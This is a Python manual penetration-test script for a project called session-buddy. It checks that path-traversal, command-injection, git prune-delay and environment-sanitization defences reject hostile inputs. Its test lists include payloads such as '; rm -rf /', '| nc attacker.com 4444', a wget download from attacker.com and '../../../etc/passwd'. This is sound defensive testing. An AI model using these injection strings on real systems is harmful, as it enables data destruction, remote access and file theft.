#!/usr/bin/env python3
"""Manual penetration testing script for session-buddy security fixes.

This script simulates various attack vectors to verify that security
mitigations are working correctly.

Run this manually after implementing security fixes to validate they work.
"""

import asyncio
import sys
from pathlib import Path

# Add project to path
sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from session_buddy.core.session_manager import SessionLifecycleManager
from session_buddy.mcp.tools.session.crackerjack_tools import _sanitize_crackerjack_args_emergency
from session_buddy.utils.git_operations import _validate_prune_delay
from session_buddy.utils.subprocess_executor import _get_safe_environment


async def test_path_traversal_attempts():
    """Test various path traversal attacks."""
    print("\n" + "="*70)
    print("🔒 Testing Path Traversal Prevention")
    print("="*70)

    manager = SessionLifecycleManager()

    traversal_attempts = [
        ("../../../etc/passwd", "Basic traversal with ../"),
        ("..\\..\\..\\windows\\system32", "Windows-style traversal"),
        ("....//....//....//etc/passwd", "Double-dot obfuscation"),
        ("/etc/passwd", "Absolute path to sensitive file"),
        ("~/../../root", "Home directory traversal"),
    ]

    for attempt, description in traversal_attempts:
        print(f"\n📍 Testing: {attempt}")
        print(f"   Description: {description}")
        try:
            result = manager._validate_working_directory(attempt)
            print(f"   ❌ FAILED: Blocked path was accepted: {result}")
        except ValueError as e:
            print(f"   ✅ PASSED: {e}")
        except Exception as e:
            print(f"   ⚠️  ERROR: Unexpected error: {e}")


def test_command_injection_attempts():
    """Test various command injection attacks."""
    print("\n" + "="*70)
    print("🔒 Testing Command Injection Prevention")
    print("="*70)

    injection_attempts = [
        ("; rm -rf /", "Semicolon command chaining"),
        ("&& curl attacker.com", "AND command chaining"),
        ("| nc attacker.com 4444", "Pipe to netcat"),
        ("`reboot`", "Backtick execution"),
        ("$(whoami)", "Command substitution"),
        ("$(sleep 5)", "Command substitution with sleep"),
        ("; wget http://attacker.com/malware", "Download malware"),
        ("&& eval 'malicious code'", "Eval injection"),
    ]

    for attempt, description in injection_attempts:
        print(f"\n💉 Testing: {attempt}")
        print(f"   Description: {description}")
        try:
            result = _sanitize_crackerjack_args_emergency(attempt)
            print(f"   ❌ FAILED: Injection was accepted: {result}")
        except ValueError as e:
            print(f"   ✅ PASSED: {e}")
        except Exception as e:
            print(f"   ⚠️  ERROR: Unexpected error: {e}")


def test_prune_delay_validation():
    """Test git prune delay validation with malicious inputs."""
    print("\n" + "="*70)
    print("🔒 Testing Git Prune Delay Validation")
    print("="*70)

    malicious_attempts = [
        ("10000.weeks", "Excessive value to abuse git gc"),
        ("$(reboot)", "Command substitution"),
        ("; rm -rf /", "Command injection"),
        ("1e6.weeks", "Scientific notation to bypass regex"),
        ("-5.days", "Negative value"),
        ("0.weeks", "Zero value"),
        ("999999999999.days", "Integer overflow attempt"),
        ("../../../etc/passwd", "Path injection"),
    ]

    for attempt, description in malicious_attempts:
        print(f"\n🌳 Testing: {attempt}")
        print(f"   Description: {description}")
        valid, msg = _validate_prune_delay(attempt)
        if valid:
            print(f"   ❌ FAILED: Malicious input was accepted")
        else:
            print(f"   ✅ PASSED: {msg}")


def test_environment_sanitization():
    """Test environment variable sanitization."""
    print("\n" + "="*70)
    print("🔒 Testing Environment Variable Sanitization")
    print("="*70)

    import os

    # Set sensitive variables
    test_vars = {
        "API_KEY": "sk-abc123",
        "SECRET_TOKEN": "secret123",
        "DB_PASSWORD": "dbpass",
        "AUTH_COOKIE": "session=xyz",
        "PRIVATE_KEY": "-----BEGIN KEY-----",
        "SAFE_VAR": "This should remain",
    }

    # Set all test variables
    for key, value in test_vars.items():
        os.environ[key] = value

    # Get sanitized environment
    safe_env = _get_safe_environment()

    print("\n🔍 Checking sensitive variables are removed:")
    sensitive_vars = ["API_KEY", "SECRET_TOKEN", "DB_PASSWORD", "AUTH_COOKIE", "PRIVATE_KEY"]

    all_passed = True
    for var in sensitive_vars:
        if var in os.environ:
            if var in safe_env:
                print(f"   ❌ FAILED: {var} was not removed from safe environment")
                all_passed = False
            else:
                print(f"   ✅ PASSED: {var} removed from safe environment")

    print("\n🔍 Checking safe variables are preserved:")
    if "SAFE_VAR" in safe_env:
        print(f"   ✅ PASSED: SAFE_VAR preserved: {safe_env['SAFE_VAR']}")
    else:
        print(f"   ❌ FAILED: SAFE_VAR was removed")

    # Cleanup
    for key in test_vars:
        if key in os.environ:
            del os.environ[key]

    if all_passed:
        print("\n✅ All environment sanitization tests passed!")


async def main():
    """Run all penetration tests."""
    print("\n" + "="*70)
    print("🛡️  SESSION-BUDDY SECURITY PENETRATION TESTING")
    print("="*70)
    print("\nThis script tests the security fixes implemented in Phase 0:")
    print("  ✅ Path traversal prevention")
    print("  ✅ Command injection blocking")
    print("  ✅ Git prune delay validation")
    print("  ✅ Environment variable sanitization")
    print("\nAny failures indicate security vulnerabilities that need fixing.")

    # Run all tests
    await test_path_traversal_attempts()
    test_command_injection_attempts()
    test_prune_delay_validation()
    test_environment_sanitization()

    print("\n" + "="*70)
    print("✅ Penetration testing complete!")
    print("="*70)


if __name__ == "__main__":
    asyncio.run(main())
